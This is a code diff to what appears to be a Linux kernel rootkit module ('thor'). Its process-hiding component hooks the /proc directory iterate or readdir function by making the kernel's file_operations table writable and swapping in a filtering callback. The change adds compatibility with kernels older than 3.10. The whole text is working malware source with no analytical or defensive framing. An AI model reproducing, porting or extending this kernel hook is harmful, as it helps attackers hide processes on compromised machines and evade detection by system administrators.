@@ -5,11 +5,16 @@
 
 #include <linux/fs.h>
 #include <linux/slab.h>
+#include <linux/version.h>
 
 #include <fs/proc/internal.h>
 
 /* function prototypes */
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+static int thor_proc_iterate(struct file *file, void *dirent, filldir_t filldir);
+#else
 static int thor_proc_iterate(struct file *file, struct dir_context *ctx);
+#endif
 static int thor_proc_filldir(void *buf, const char *name, int namelen,
         loff_t offset, u64 ino, unsigned d_type);
 
@@ -29,7 +34,11 @@ static struct proc_dir_entry *procroot;
 static struct file_operations *proc_fops;
 
 /* pointer to original proc_iterate function */
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+static int (*orig_proc_iterate)(struct file *file, void *dirent, filldir_t filldir);
+#else
 static int (*orig_proc_iterate)(struct file *, struct dir_context *);
+#endif
 
 /* pointer to original proc_filldir function */
 static int (*orig_proc_filldir)(void *buf, const char *name, int namelen,
@@ -40,10 +49,18 @@ int prochider_init(void)
     /* insert our modified iterate for /proc */
     procroot = procfile->parent;
     proc_fops = (struct file_operations*) procroot->proc_fops;
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+    orig_proc_iterate = proc_fops->readdir;
+#else
     orig_proc_iterate = proc_fops->iterate;
+#endif
 
     set_addr_rw(proc_fops);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+    proc_fops->readdir = thor_proc_iterate;
+#else
     proc_fops->iterate = thor_proc_iterate;
+#endif
     set_addr_ro(proc_fops);
 
     INIT_LIST_HEAD(&pid_list.list);
@@ -55,13 +72,23 @@ void prochider_cleanup(void)
 {
     if (proc_fops != NULL && orig_proc_iterate != NULL) {
         set_addr_rw(proc_fops);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+        proc_fops->readdir = orig_proc_iterate;
+#else
         proc_fops->iterate = orig_proc_iterate;
+#endif
         set_addr_ro(proc_fops);
     }
 
     clear_pid_list();
 }
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
+static int thor_proc_iterate(struct file *file, void *dirent, filldir_t filldir)
+{
+    return orig_proc_iterate(file, dirent, thor_proc_filldir);
+}
+#else
 static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
 {
     int ret;
@@ -82,6 +109,7 @@ static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
 
     return ret;
 }
+#endif
 
 static int thor_proc_filldir(void *buf, const char *name, int namelen,
         loff_t offset, u64 ino, unsigned d_type)
